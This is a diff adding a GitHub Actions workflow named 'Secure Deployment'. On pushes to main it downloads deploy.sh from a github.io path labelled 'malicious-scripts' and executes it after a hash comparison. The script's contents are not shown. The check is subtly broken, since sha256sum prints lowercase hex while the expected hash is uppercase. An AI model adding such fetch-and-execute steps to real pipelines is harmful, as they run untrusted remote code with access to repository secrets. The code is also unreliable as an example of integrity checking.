@@ -1,0 +1,33 @@
+name: Secure Deployment
+
+on:  
+  push:  
+    branches:  
+      - main  
+
+jobs:  
+  deploy:  
+    runs-on: ubuntu-latest  
+
+    steps:  
+      - name: Checkout Repository  
+        uses: actions/checkout@v3  
+
+      - name: Download Deployment Script (With Hash Verification)  
+        run: |  
+          DEPLOY_URL="https://linustimodaniels.github.io/malicious-scripts/deploy.sh"  
+          EXPECTED_HASH="5128CDD384A2E90BCCDA2D1D39D7BEB27696E5045534B4396B4BDB2C16F4338D"
+
+          # Download script
+          curl -o deploy.sh "$DEPLOY_URL"  
+
+          # Verify integrity  
+          ACTUAL_HASH=$(sha256sum deploy.sh | awk '{print $1}')  
+          if [[ "$ACTUAL_HASH" != "$EXPECTED_HASH" ]]; then  
+            echo "ERROR: File integrity check failed!"  
+            exit 1  
+          fi  
+
+          # Execute only if hash matches  
+          chmod +x deploy.sh  
+          ./deploy.sh  
